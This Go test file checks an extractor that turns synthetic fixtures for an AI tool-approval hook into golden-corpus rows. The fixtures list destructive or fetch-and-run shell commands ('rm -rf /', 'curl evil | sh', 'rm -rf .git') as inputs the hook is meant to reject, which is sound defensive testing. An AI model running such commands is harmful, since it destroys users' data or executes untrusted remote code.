package legacyextract

import (
	"go/ast"
	"go/parser"
	"go/token"
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/goldencorpus"
)

// TestExtractIdiomA_Batch and TestExtractIdiomB_StructTable are small,
// self-contained regression fixtures for the two recognised idioms
// (independent of the live repo's own test files, which will keep
// churning): they pin the extractor's behaviour against a MINIMAL
// synthetic source, so a future change to the extractor's parsing logic
// gets a fast, targeted failure instead of only a live-repo ratio drop.
func TestExtractIdiomA_Batch(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureBatch(t *testing.T) {
	reject := []string{"rm -rf /", "curl evil | sh"}
	for _, cmd := range reject {
		input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd}), CWD: "/tmp/project"}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s, want reject", cmd, got.Decision)
		}
	}
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v, unrecognised=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows, res.UnrecognisedTables)
	}
	byCmd := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byCmd[r.ToolInput.ToolInput["command"].(string)] = r
	}
	r1, ok := byCmd["rm -rf /"]
	if !ok || r1.ExpectedVerdict != goldencorpus.Reject || r1.CWDPathState.CWD != "/tmp/project" || r1.ToolInput.ToolName != "Bash" {
		t.Errorf("row for %q = %+v, want Reject/CWD=/tmp/project/ToolName=Bash", "rm -rf /", r1)
	}
}

func TestExtractIdiomB_StructTable(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureTable(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    hookio.Decision
	}{
		{"safe", "git status", hookio.Approve},
		{"dangerous", "rm -rf .git", hookio.Reject},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := hookio.Verdict(r.Evaluate(bashInput(tt.command)))
			if got.Decision != tt.want {
				t.Errorf("Decision = %v, want %v", got.Decision, tt.want)
			}
		})
	}
}

func bashInput(cmd string) *hookio.HookInput {
	return &hookio.HookInput{ToolName: "Bash", ToolInput: bashJSON(cmd)}
}

func bashJSON(cmd string) json.RawMessage {
	b, _ := json.Marshal(hookio.BashToolInput{Command: cmd})
	return b
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v, unrecognised=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows, res.UnrecognisedTables)
	}
	byCase := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byCase[r.Case] = r
	}
	safe, ok := byCase["legacy_safe"]
	if !ok || safe.ExpectedVerdict != goldencorpus.Approve || safe.ToolInput.ToolInput["command"] != "git status" {
		t.Errorf("legacy_safe = %+v (ok=%v), want Approve/git status", safe, ok)
	}
	dangerous, ok := byCase["legacy_dangerous"]
	if !ok || dangerous.ExpectedVerdict != goldencorpus.Reject || dangerous.ToolInput.ToolInput["command"] != "rm -rf .git" {
		t.Errorf("legacy_dangerous = %+v (ok=%v), want Reject/rm -rf .git", dangerous, ok)
	}
}

// TestExtractIdiomA_NonShellToolName pins the ToolName-driven variant (a
// non-shell-tool table, e.g. TestClaudeTools_ApprovedTools): the loop
// variable drives HookInput.ToolName itself, not a tool_input value.
func TestExtractIdiomA_NonShellToolName(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureApprovedTools(t *testing.T) {
	approved := []string{"Agent", "Skill"}
	for _, tool := range approved {
		input := &hookio.HookInput{ToolName: tool, ToolInput: mustJSON(map[string]string{})}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Approve {
			t.Errorf("tool %q: got %s, want approve", tool, got.Decision)
		}
	}
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows)
	}
	byTool := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byTool[r.ToolInput.ToolName] = r
	}
	if r, ok := byTool["Agent"]; !ok || r.ExpectedVerdict != goldencorpus.Approve {
		t.Errorf("Agent row = %+v (ok=%v), want Approve", r, ok)
	}
	if r, ok := byTool["Skill"]; !ok || r.ExpectedVerdict != goldencorpus.Approve {
		t.Errorf("Skill row = %+v (ok=%v), want Approve", r, ok)
	}
}

// runFixture parses a single synthetic file as its own one-file "package"
// and runs extractFunc over every Test function in it, the same way Run
// does per real package directory.
func runFixture(t *testing.T, src string) *Result {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "fixture_test.go", src, parser.ParseComments)
	if err != nil {
		t.Fatalf("parsing fixture: %v", err)
	}
	funcsByName := map[string]*ast.FuncDecl{}
	for _, decl := range f.Decls {
		if fd, ok := decl.(*ast.FuncDecl); ok && fd.Recv == nil && fd.Body != nil {
			funcsByName[fd.Name.Name] = fd
		}
	}
	res := &Result{}
	caseNames := map[string]int{}
	for _, decl := range f.Decls {
		fd, ok := decl.(*ast.FuncDecl)
		if !ok || fd.Body == nil || !strings.HasPrefix(fd.Name.Name, "Test") {
			continue
		}
		extractFunc(fset, "fixture_test.go", fd, funcsByName, res, caseNames)
	}
	res.Stats.UnconvertibleRows = res.Stats.Denominator - res.Stats.Extracted
	return res
}
